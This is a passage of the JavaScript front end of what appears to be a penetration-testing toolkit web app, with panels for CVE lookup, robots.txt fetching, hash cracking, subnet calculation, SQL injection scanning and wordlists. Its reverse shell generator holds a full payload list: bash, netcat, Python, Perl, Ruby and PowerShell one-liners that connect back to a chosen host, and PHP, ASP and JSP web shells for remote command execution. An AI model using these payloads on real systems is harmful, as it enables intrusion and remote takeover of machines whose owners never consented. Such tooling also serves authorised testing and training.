    if (r.cves?.length) {
        body += `<div class="cve-section-label">CVEs</div>`;
        r.cves.forEach(c => body += `
            <div class="cve-row">
                <span class="cve-id cve-id-${c.severity}">${esc(c.id)}</span>
                <span class="cve-id-desc">${esc(c.description)}</span>
                <button class="copy-inline" onclick="copyText('${esc(c.id)}')">COPY</button>
            </div>`);
    }
    if (r.default_creds?.length) {
        body += `<div class="cve-section-label">Default Credentials</div><div style="padding:4px 0">`;
        r.default_creds.forEach(c => body += `<span class="vuln-cred">${esc(c.user || '(blank)')} / ${esc(c.pass || '(blank)')}</span>`);
        body += '</div>';
    }
    if (r.nmap_scripts?.length) {
        const scriptStr = `nmap -sV --script ${r.nmap_scripts.join(',')} -p ${r.port} ${appState.target_ip || '<target>'}`;
        body += `<div class="cve-section-label">Nmap Scripts</div>
            <div class="cve-scripts">${esc(scriptStr)} <button class="copy-inline" onclick="copyText(${JSON.stringify(scriptStr)})">COPY</button></div>`;
    }
    if (r.remediation) {
        body += `<div class="cve-section-label">Remediation</div><div class="cve-remediation">${esc(r.remediation)}</div>`;
    }

    return `<div class="cve-card sev-${r.severity}">
        <div class="cve-card-header" onclick="this.nextElementSibling.classList.toggle('open')">
            <span class="cve-port-badge">:${r.port}</span>
            <span class="cve-service-name">${esc(r.service)}</span>
            <span class="cve-counts">
                <span style="color:${sevColor}">${r.severity.toUpperCase()}</span>
                <span>${r.cves?.length || 0} CVEs</span>
                <span>${r.issues?.length || 0} issues</span>
            </span>
        </div>
        <div class="cve-card-body">${body}</div>
    </div>`;
}

// ─── ROBOTS.TXT / SITEMAP ────────────────────────────────────────────
document.getElementById('rob-fetch-btn').addEventListener('click', fetchRobots);

async function fetchRobots() {
    const url     = el('rob-url').value.trim();
    const results = el('rob-results');
    if (!url) { toast('Enter a target URL'); return; }

    logEvent('ROBOTS', `Fetching robots.txt and sitemap for ${url}`);
    results.innerHTML = '<div class="log-info">Fetching...</div>';
    el('rob-fetch-btn').disabled = true;

    try {
        const d = await (await fetch(`/api/robots?url=${enc(url)}`)).json();
        if (d.error) { results.innerHTML = `<div class="log-error">[!] ${esc(d.error)}</div>`; return; }

        results.innerHTML = '';

        // Disallow section
        const disallowHtml = (d.disallow || []).map(p => `
            <div class="rob-disallow">
                <span style="flex:1">${esc(p)}</span>
                <button class="copy-inline" onclick="copyText(${JSON.stringify(p)})">COPY</button>
            </div>`).join('');

        results.insertAdjacentHTML('beforeend', `
            <div class="rob-section">
                <div class="rob-section-title">
                    Disallow Entries
                    <span class="rob-section-count">${d.disallow?.length || 0}</span>
                    ${d.robots_error ? `<span style="color:var(--red);font-size:11px">[!] ${esc(d.robots_error)}]</span>` : ''}
                </div>
                ${disallowHtml || '<div style="padding:8px 12px;color:var(--text-muted);font-family:var(--mono);font-size:12px">None found</div>'}
            </div>`);

        // Allow section
        if (d.allow?.length) {
            results.insertAdjacentHTML('beforeend', `
                <div class="rob-section">
                    <div class="rob-section-title">Allow Entries <span class="rob-section-count">${d.allow.length}</span></div>
                    ${d.allow.map(p => `<div class="rob-allow">${esc(p)}</div>`).join('')}
                </div>`);
        }

        // Sitemap URLs
        if (d.sitemap_urls?.length) {
            const smHtml = d.sitemap_urls.map(u => `
                <div class="rob-sitemap-url">
                    <span style="flex:1">${esc(u)}</span>
                    <button class="copy-inline" onclick="copyText(${JSON.stringify(u)})">COPY</button>
                </div>`).join('');
            results.insertAdjacentHTML('beforeend', `
                <div class="rob-section">
                    <div class="rob-section-title">
                        Sitemap URLs <span class="rob-section-count">${d.sitemap_urls.length}</span>
                        ${d.sitemap_error ? `<span style="color:var(--red);font-size:11px">[!] ${esc(d.sitemap_error)}]</span>` : ''}
                    </div>
                    ${smHtml}
                </div>`);
        } else if (d.sitemap_error) {
            results.insertAdjacentHTML('beforeend', `
                <div class="rob-section">
                    <div class="rob-section-title">Sitemap</div>
                    <div style="padding:8px 12px;font-family:var(--mono);font-size:12px;color:var(--red)">[!] ${esc(d.sitemap_error)}</div>
                </div>`);
        }

        // Raw robots.txt toggle
        if (d.robots_raw) {
            const rawId = 'rob-raw-' + Date.now();
            results.insertAdjacentHTML('beforeend', `
                <div class="rob-section">
                    <div class="rob-section-title" style="cursor:pointer" onclick="el('${rawId}').classList.toggle('hidden')">
                        Raw robots.txt <span style="font-size:10px;opacity:0.6">(click to toggle)</span>
                    </div>
                    <pre class="rob-raw hidden" id="${rawId}">${esc(d.robots_raw)}</pre>
                </div>`);
        }

        const totalFound = (d.disallow?.length || 0) + (d.sitemap_urls?.length || 0);
        logEvent('ROBOTS', `Complete — ${d.disallow?.length || 0} disallowed paths, ${d.sitemap_urls?.length || 0} sitemap URLs`);
        pushState({ target_url: url });
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    } finally {
        el('rob-fetch-btn').disabled = false;
    }
}

// ─── REVERSE SHELL GENERATOR ─────────────────────────────────────────
const RS_SHELLS = {
    'Listeners': [
        { label: 'Netcat',              cmd: `nc -lvnp {PORT}` },
        { label: 'Netcat (keep open)',  cmd: `nc -lvnp {PORT} -k` },
        { label: 'rlwrap + Netcat',     cmd: `rlwrap nc -lvnp {PORT}` },
        { label: 'Socat PTY Listener',  cmd: `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:{PORT}` },
        { label: 'pwncat-cs',           cmd: `pwncat-cs -lp {PORT}` },
    ],
    'Linux — Bash / Shell': [
        { label: 'Bash TCP',            cmd: `bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1` },
        { label: 'Bash TCP (alt)',       cmd: `bash -c 'bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1'` },
        { label: 'Bash UDP',            cmd: `bash -i >& /dev/udp/{HOST}/{PORT} 0>&1` },
        { label: 'sh TCP',              cmd: `sh -i >& /dev/tcp/{HOST}/{PORT} 0>&1` },
        { label: 'Socat',               cmd: `socat TCP:{HOST}:{PORT} EXEC:/bin/bash` },
        { label: 'Socat PTY',           cmd: `socat TCP:{HOST}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
        { label: 'Netcat -e',           cmd: `nc -e /bin/bash {HOST} {PORT}` },
        { label: 'Netcat mkfifo',       cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {HOST} {PORT} >/tmp/f` },
        { label: 'Netcat BusyBox',      cmd: `busybox nc {HOST} {PORT} -e /bin/bash` },
        { label: 'AWK',                 cmd: `awk 'BEGIN{s="/inet/tcp/0/{HOST}/{PORT}";for(;;){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'` },
    ],
    'Linux — Languages': [
        { label: 'Python 3',            cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'` },
        { label: 'Python 2',            cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
        { label: 'Perl',                cmd: `perl -e 'use Socket;$i="{HOST}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}'` },
        { label: 'Ruby',                cmd: `ruby -rsocket -e 'f=TCPSocket.open("{HOST}",{PORT}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'` },
        { label: 'PHP (system)',         cmd: `php -r '$sock=fsockopen("{HOST}",{PORT});exec("/bin/bash -i <&3 >&3 2>&3");'` },
        { label: 'Lua',                 cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{HOST}','{PORT}');os.execute('/bin/bash -i <&3 >&3 2>&3');"` },
    ],
    'Windows': [
        { label: 'PowerShell',          cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client=New-Object System.Net.Sockets.TCPClient('{HOST}',{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
        { label: 'PowerShell (short)',   cmd: `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAe0hPU1R9ACIALAAgAHsAUABPAFIAVAB9ACkA` },
        { label: 'Python (Windows)',     cmd: `python -c "import socket,subprocess;s=socket.socket();s.connect(('{HOST}',{PORT}));[subprocess.call('cmd',stdin=s,stdout=s,stderr=s)]"` },
        { label: 'Netcat (Windows)',     cmd: `nc.exe -e cmd.exe {HOST} {PORT}` },
        { label: 'CMD + Netcat',         cmd: `cmd.exe /c nc.exe -e cmd.exe {HOST} {PORT}` },
    ],
    'Web Shells': [
        { label: 'PHP — RCE (GET)',      cmd: `<?php system($_GET['cmd']); ?>` },
        { label: 'PHP — RCE (REQUEST)',  cmd: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd=$_REQUEST['cmd']; system($cmd); echo "</pre>"; die; } ?>` },
        { label: 'PHP — Reverse Shell',  cmd: `<?php $sock=fsockopen("{HOST}",{PORT});$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>` },
        { label: 'ASP — RCE',           cmd: `<% Set o=CreateObject("WScript.Shell"):o.Run "cmd /c "+Request("cmd"),0,True %>` },
        { label: 'ASPX — RCE',          cmd: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>` },
        { label: 'JSP — RCE',           cmd: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` },
    ],
};

let _lastRevShellCmds = [];

function generateRevShells() {
    const host    = el('rs-lhost').value.trim() || '{LHOST}';
    const port    = el('rs-lport').value.trim() || '4444';
    const output  = el('rs-output');

    // Fix #21: validate LHOST input
    if (!el('rs-lhost').value.trim()) {
        showInputError('rs-lhost', 'Enter your listener IP (LHOST)');
        return;
    }

    logEvent('REVSHELL', `Generated shells — LHOST:${host} LPORT:${port}`);
    output.innerHTML = '';
    _lastRevShellCmds = [];

    Object.entries(RS_SHELLS).forEach(([cat, shells]) => {
        output.insertAdjacentHTML('beforeend', `<div class="rs-cat-header">${esc(cat)}</div>`);
        shells.forEach(s => {
            const cmd = s.cmd.replace(/\{HOST\}/g, host).replace(/\{PORT\}/g, port);
            _lastRevShellCmds.push(`# ${s.label}\n${cmd}`);
            output.insertAdjacentHTML('beforeend', `
                <div class="rs-row">
                    <div class="rs-row-top">
                        <span class="rs-label">${esc(s.label)}</span>
                        <button class="copy-inline" onclick="copyText(${JSON.stringify(cmd)})">COPY</button>
                    </div>
                    <div class="rs-cmd">${esc(cmd)}</div>
                </div>`);
        });
    });

    // Fix #23: show Copy All button
    const copyAllBtn = el('rs-copy-all-btn');
    if (copyAllBtn) copyAllBtn.style.display = '';
}

// Fix #23: copy all shell commands
function copyAllShells() {
    if (!_lastRevShellCmds.length) return;
    copyText(_lastRevShellCmds.join('\n\n'));
    toast('All shells copied');
}

// ─── HASH CRACKER ────────────────────────────────────────────────────
let hashCrackSSE = null;

document.getElementById('hc-crack-btn').addEventListener('click', startHashCrack);
document.getElementById('hc-stop-btn').addEventListener('click', stopHashCrack);

function startHashCrack() {
    const hash     = el('hc-hash').value.trim();
    const algo     = el('hc-algo').value;
    const customWl = el('hc-wordlist') ? el('hc-wordlist').value : '';
    const results  = el('hc-results');

    if (!hash) { showInputError('hc-hash', 'Enter a hash to crack'); return; }
    if (hashCrackSSE) { hashCrackSSE.close(); hashCrackSSE = null; }

    logEvent('HASH-CRACK', `Cracking ${algo === 'auto' ? 'auto-detect' : algo.toUpperCase()}: ${hash.slice(0, 32)}${hash.length > 32 ? '…' : ''}`);
    results.innerHTML = '';
    el('hc-progress').classList.remove('hidden');
    el('hc-crack-btn').disabled = true;
    el('hc-stop-btn').classList.remove('hidden');

    const hcStart = Date.now();
    let apiUrl = `/api/hash/crack?hash=${enc(hash)}&algo=${enc(algo)}`;
    if (customWl) apiUrl += `&wordlist=${enc(customWl)}`;

    hashCrackSSE = new EventSource(apiUrl);

    hashCrackSSE.onmessage = e => {
        const d = JSON.parse(e.data);
        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'progress') {
            // Fix #22: ETA for hash cracker
            const elapsed = (Date.now() - hcStart) / 1000;
            const rate = d.tried / (elapsed || 0.001);
            const remaining = d.total - d.tried;
            const eta = rate > 0 && remaining > 0 ? Math.round(remaining / rate) : null;
            const etaStr = eta !== null ? ` · ETA ${eta}s` : '';
            setProgress('hc', d.percent, `${d.percent}%  ${d.tried}/${d.total}  current: ${esc(d.current)}${etaStr}`);
        } else if (d.type === 'found') {
            logEvent('HASH-CRACK', `FOUND — hash ${hash.slice(0,16)}… = "${d.password}" (${d.algo.toUpperCase()})`);
            results.insertAdjacentHTML('beforeend', `
                <div class="hc-found">
                    <div class="hc-found-label">Password Found</div>
                    <div class="hc-found-pass">${esc(d.password)}</div>
                    <div class="hc-found-meta">${d.algo.toUpperCase()} hash cracked
                        <button class="copy-inline" style="margin-left:10px" onclick="copyText(${JSON.stringify(d.password)})">COPY PASSWORD</button>
                    </div>
                </div>`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">[!] ${esc(d.message)}</div>`);
            stopHashCrack();
        } else if (d.type === 'complete') {
            setProgress('hc', 100, `Done — tried ${d.tried} passwords`);
            logEvent('HASH-CRACK', `Complete — ${d.found ? 'cracked' : 'not found'} after ${d.tried} attempts`);
            if (!d.found) {
                results.insertAdjacentHTML('beforeend', `<div class="hc-notfound">[✗] Hash not found in wordlist — try a larger wordlist or GPU cracking tool</div>`);
            }
            stopHashCrack();
        }
    };

    hashCrackSSE.onerror = () => stopHashCrack();
}

function stopHashCrack() {
    if (hashCrackSSE) { hashCrackSSE.close(); hashCrackSSE = null; }
    const b = el('hc-crack-btn'); if (b) b.disabled = false;
    const s = el('hc-stop-btn');  if (s) s.classList.add('hidden');
}

// ─── SUBNET CALCULATOR ───────────────────────────────────────────────
function snPreset(suffix) {
    const current = el('sn-cidr').value.trim();
    const base    = current.includes('/') ? current.split('/')[0] : (current || '192.168.1.0');
    el('sn-cidr').value = base + suffix;
    calcSubnet();
}

function calcSubnet() {
    const input   = el('sn-cidr').value.trim();
    const results = el('sn-results');
    if (!input) { toast('Enter CIDR notation'); return; }

    if (!input.includes('/')) { toast('Use CIDR format: 192.168.1.0/24'); return; }
    const [ipStr, prefixStr] = input.split('/');
    const prefix = parseInt(prefixStr, 10);

    if (isNaN(prefix) || prefix < 0 || prefix > 32) { toast('Prefix must be 0–32'); return; }

    const parts = ipStr.split('.').map(Number);
    if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255)) { toast('Invalid IP address'); return; }

    const toInt = p => ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
    const toIp  = n => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
    const fmt   = n => n.toLocaleString();

    const ipInt      = toInt(parts);
    const maskInt    = prefix === 0 ? 0 : (0xFFFFFFFF << (32 - prefix)) >>> 0;
    const networkInt = (ipInt & maskInt) >>> 0;
    const broadInt   = (networkInt | (~maskInt >>> 0)) >>> 0;
    const firstInt   = prefix >= 31 ? networkInt : (networkInt + 1) >>> 0;
    const lastInt    = prefix >= 31 ? broadInt   : (broadInt - 1)   >>> 0;
    const totalHosts = Math.pow(2, 32 - prefix);
    const usable     = prefix >= 31 ? totalHosts : totalHosts - 2;
    const wildcard   = (~maskInt) >>> 0;

    logEvent('SUBNET', `${input} → network ${toIp(networkInt)}, ${fmt(usable)} usable hosts`);

    const row = (label, val, sub) => `
        <div class="sn-stat">
            <div class="sn-stat-label">${label}</div>
            <div class="sn-stat-val">
                ${esc(val)}
                <button class="copy-inline" onclick="copyText('${esc(val)}')" style="font-size:10px">COPY</button>
            </div>
            ${sub ? `<div style="font-family:var(--mono);font-size:11px;color:var(--text-muted);margin-top:3px">${esc(sub)}</div>` : ''}
        </div>`;

    results.innerHTML = `
        <div style="padding:8px 14px;font-family:var(--mono);font-size:12px;color:var(--text-muted);border-bottom:1px solid var(--border-2)">
            Subnet: <span style="color:var(--accent)">${esc(input)}</span>
        </div>
        <div class="sn-grid" style="padding:12px 12px 4px">
            ${row('Network Address',   toIp(networkInt), `/${prefix} — ${toIp(maskInt)}`)}
            ${row('Broadcast Address', toIp(broadInt))}
            ${row('Subnet Mask',       toIp(maskInt),    `Wildcard: ${toIp(wildcard)}`)}
            ${row('First Usable Host', toIp(firstInt))}
            ${row('Last Usable Host',  toIp(lastInt))}
            ${row('Usable Hosts',      fmt(usable))}
            ${row('Total Addresses',   fmt(totalHosts),  `/${prefix} = 2^${32 - prefix}`)}
            ${row('CIDR',              `${toIp(networkInt)}/${prefix}`)}
        </div>
        <div class="sn-all-ips" style="padding:10px 14px">
            <div style="font-family:var(--mono);font-size:11px;color:var(--text-muted);letter-spacing:1px;margin-bottom:4px">RANGE</div>
            <div class="sn-ip-range">${toIp(firstInt)} → ${toIp(lastInt)}</div>
        </div>`;
}

// ─── SQL INJECTION SCANNER ───────────────────────────────────────────
let sqliSSE = null;

document.addEventListener('DOMContentLoaded', () => {
    const sqliBtn  = el('sqli-scan-btn');
    const sqliAuto = el('sqli-auto-btn');
    const sqliStop = el('sqli-stop-btn');
    if (sqliBtn)  sqliBtn.addEventListener('click', startSqliScan);
    if (sqliAuto) sqliAuto.addEventListener('click', () => startSqliScan(true));
    if (sqliStop) sqliStop.addEventListener('click', () => {
        if (sqliSSE) { sqliSSE.close(); sqliSSE = null; }
        scanDone('sqli');
    });

    // Fix #20: recursive toggle shows depth field
    const dirRec = el('dir-recursive');
    if (dirRec) {
        dirRec.addEventListener('change', () => {
            const wrap = el('dir-depth-wrap');
            if (wrap) wrap.style.display = dirRec.checked ? '' : 'none';
        });
    }
});

function startSqliScan(autoMode = false) {
    const url   = el('sqli-url').value.trim();
    const param = autoMode ? 'auto' : el('sqli-param').value.trim();
    const method = el('sqli-method') ? el('sqli-method').value : 'GET';
    const proxy  = el('sqli-proxy') ? el('sqli-proxy').value.trim() : '';

    if (!url) { showInputError('sqli-url', 'Enter a target URL'); return; }
    if (!autoMode && !param) { showInputError('sqli-param', 'Enter a parameter name — or click Auto-scan'); return; }

    logEvent('SQLI', `Scan started — ${url} param=${param} method=${method}`);
    if (sqliSSE) { sqliSSE.close(); sqliSSE = null; }

    const results = el('sqli-results');
    results.innerHTML = '';
    el('sqli-progress').classList.remove('hidden');
    el('sqli-actions').classList.add('hidden');
    el('sqli-scan-btn').disabled = true;
    el('sqli-stop-btn').classList.remove('hidden');

    let apiUrl = `/api/sqli/scan?url=${enc(url)}&param=${enc(param)}&method=${enc(method)}`;
    if (proxy) apiUrl += `&proxy=${enc(proxy)}`;

    sqliSSE = new EventSource(apiUrl);
    let sqliFindings = [];

    sqliSSE.onmessage = e => {
        const d = JSON.parse(e.data);
        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'param_start') {
            setProgress('sqli', 0, `Testing param: ${esc(d.param)}...`);
        } else if (d.type === 'found') {
            logEvent('SQLI', `FOUND ${d.type} — param: ${d.param || param} payload: ${d.payload}`);
            sqliFindings.push(d);
            const sev = d.type === 'Error-Based' ? 'var(--red)' : 'var(--amber)';
            const paramBadge = d.param ? `<span style="font-family:var(--mono);font-size:10px;color:var(--accent);margin-right:4px">?${esc(d.param)}</span>` : '';
            results.insertAdjacentHTML('beforeend', `
                <div class="r-row r-found">
                    ${paramBadge}
                    <span style="font-family:var(--mono);font-size:11px;font-weight:700;color:${sev}">${esc(d.type)}</span>
                    <span class="r-url" style="font-family:var(--mono);font-size:12px" title="${esc(d.payload)}">${esc(d.payload.slice(0,40))}</span>
                    <span style="font-size:11px;color:var(--text-muted)">${esc(d.detail)}</span>
                    <button class="copy-inline" onclick="copyText(${JSON.stringify(d.payload)})">COPY</button>
                </div>
            `);
            results.scrollTop = results.scrollHeight;
        } else if (d.type === 'progress') {
            setProgress('sqli', d.percent, `${d.percent}%  ${d.tried}/${d.total}  ${esc(d.current)}`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">${esc(d.message)}</div>`);
        } else if (d.type === 'complete') {
            setProgress('sqli', 100, `Done — ${d.findings.length} finding${d.findings.length !== 1 ? 's' : ''} (severity: ${d.severity})`);
            logEvent('SQLI', `Complete — ${d.findings.length} finding(s), severity: ${d.severity} on ${url}`);
            window._lastSqliData = d;
            el('sqli-actions').classList.remove('hidden');
            if (sqliSSE) { sqliSSE.close(); sqliSSE = null; }
            el('sqli-scan-btn').disabled = false;
            el('sqli-stop-btn').classList.add('hidden');
            if (!d.findings.length) {
                results.insertAdjacentHTML('beforeend', `<div class="log-info">No SQL injection indicators found — target may not be vulnerable, or try different parameters/methods.</div>`);
            }
        }
    };
    sqliSSE.onerror = () => {
        if (sqliSSE) { sqliSSE.close(); sqliSSE = null; }
        el('sqli-scan-btn').disabled = false;
        el('sqli-stop-btn').classList.add('hidden');
    };
}

// ─── WORDLISTS MANAGER ───────────────────────────────────────────────
async function loadWordlists() {
    try {
        const d = await (await fetch('/api/wordlist/list')).json();
        const results = el('wl-results');
        if (!results) return;

        const builtInRows = d.built_in.map(f => `
            <div class="report-row">
                <span class="report-name">${esc(f)}</span>
                <span style="font-family:var(--mono);font-size:11px;color:var(--text-muted)">built-in</span>
            </div>`).join('');

        const customRows = d.custom.map(f => `
            <div class="report-row">
                <span class="report-name">${esc(f)}</span>
                <div style="display:flex;align-items:center;gap:8px">
                    <span style="font-family:var(--mono);font-size:11px;color:var(--text-muted)">uploaded</span>
                    <button class="btn btn-danger" style="padding:2px 10px;font-size:12px" onclick="removeWordlist('${esc(f)}')">Remove</button>
                </div>
            </div>`).join('');

        results.innerHTML = (builtInRows + customRows) || '<div class="results-placeholder">No wordlists found.</div>';
        refreshWordlistSelects(d.custom);
    } catch (e) {
        const results = el('wl-results');
        if (results) results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    }
}

async function removeWordlist(filename) {
    try {
        const r = await fetch('/api/wordlist/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename })
        });
        const d = await r.json();
        if (d.error) { toast(d.error); return; }
        toast(`Removed ${filename}`);
        logEvent('WORDLIST', `Removed ${filename}`);
        loadWordlists();
    } catch (e) {
        toast('Remove failed: ' + e.message);
    }
}

async function uploadWordlist() {
    const fileInput = el('wl-file');
    if (!fileInput || !fileInput.files.length) {
        toast('Select a .txt file first');
        return;
    }
    const formData = new FormData();
    formData.append('file', fileInput.files[0]);
    try {
        const r = await fetch('/api/wordlist/upload', { method: 'POST', body: formData });
        const d = await r.json();
        if (d.error) { toast(d.error); return; }
        toast(`Uploaded ${d.filename} — ${d.count} entries`);
        logEvent('WORDLIST', `Uploaded ${d.filename} (${d.count} entries)`);
        fileInput.value = '';
        loadWordlists();
    } catch (e) {
        toast('Upload failed: ' + e.message);
    }
}

async function refreshWordlistSelects(customList) {
    if (!customList) {
        try {
            const d = await (await fetch('/api/wordlist/list')).json();
            customList = d.custom || [];
        } catch (e) { return; }
    }

    const selects = ['dir-wordlist', 'wb-wordlist', 'sub-wordlist', 'hc-wordlist'];
    selects.forEach(id => {
        const sel = el(id);
        if (!sel) return;
        const current = sel.value;
        sel.innerHTML = '<option value="">— built-in —</option>' +
            customList.map(f => `<option value="${esc(f)}"${f === current ? ' selected' : ''}>${esc(f)}</option>`).join('');
    });
}

// ─── HTML EXPORT ─────────────────────────────────────────────────────
function exportReportHtml(filename) {
    window.open(`/api/reports/export-html/${encodeURIComponent(filename)}`, '_blank');
}

// ─── INPUT VALIDATION HELPERS ─────────────────────────────────────────
// Fix #21: show inline validation error under input
function showInputError(inputId, message) {
    const inp = el(inputId);
    if (!inp) { toast(message); return; }
    inp.classList.add('input-error');
    inp.focus();
    let errEl = inp.parentNode.querySelector('.input-error-msg');
    if (!errEl) {
        errEl = document.createElement('div');
        errEl.className = 'input-error-msg';
        inp.parentNode.appendChild(errEl);
    }
    errEl.textContent = message;
    inp.addEventListener('input', () => {
        inp.classList.remove('input-error');
        if (errEl) errEl.remove();
    }, { once: true });
}

// ─── HELPERS ────────────────────────────────────────────────────────
function el(id) { return document.getElementById(id); }
function enc(s) { return encodeURIComponent(s); }

function esc(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

async function post(url, body) {
    const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return r.json();
}

function setProgress(prefix, percent, label) {
    const fill = el(`${prefix}-progress-fill`);
    const lbl  = el(`${prefix}-progress-label`);
    if (fill) fill.style.width = percent + '%';
    if (lbl)  lbl.textContent = label;
}

function scanDone(prefix) {
    const scanBtn = el(`${prefix}-scan-btn`);
    const stopBtn = el(`${prefix}-stop-btn`);
    if (scanBtn) scanBtn.disabled = false;
    if (stopBtn) stopBtn.classList.add('hidden');
    if (activeSSE) { activeSSE.close(); activeSSE = null; }
}

function stopSSE() {
    if (activeSSE) { activeSSE.close(); activeSSE = null; }
    ['ps', 'sub', 'dir', 'wb'].forEach(p => {
        const btn  = el(`${p}-scan-btn`);
        const stop = el(`${p}-stop-btn`);
        if (btn)  btn.disabled = false;
        if (stop) stop.classList.add('hidden');
    });
}

function statusClass(code) {
    if (code >= 200 && code < 300) return 's200';
    if (code === 301 || code === 302 || code === 307 || code === 308) return 's301';
    if (code === 401) return 's401';
    if (code === 403) return 's403';
    if (code >= 500) return 's500';
    return '';
}

function fmtSize(bytes) {
    if (!bytes) return '0 B';
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / 1048576).toFixed(1)} MB`;
}

function copyResults(id) {
    const text = el(id) ? el(id).innerText : '';
    navigator.clipboard.writeText(text).then(() => toast('Copied'));
}

function copyText(text) {
    navigator.clipboard.writeText(text).then(() => toast('Copied'));
}

// State chip copy buttons
document.querySelectorAll('.state-copy').forEach(btn => {
    btn.addEventListener('click', () => {
        const chip = btn.closest('.state-chip');
        const val = chip ? chip.dataset.copy : '';
        if (val) copyText(val);
    });
});

// ─── TOAST ──────────────────────────────────────────────────────────
let toastTimeout;
function toast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(toastTimeout);
    toastTimeout = setTimeout(() => t.classList.remove('show'), 2000);
}
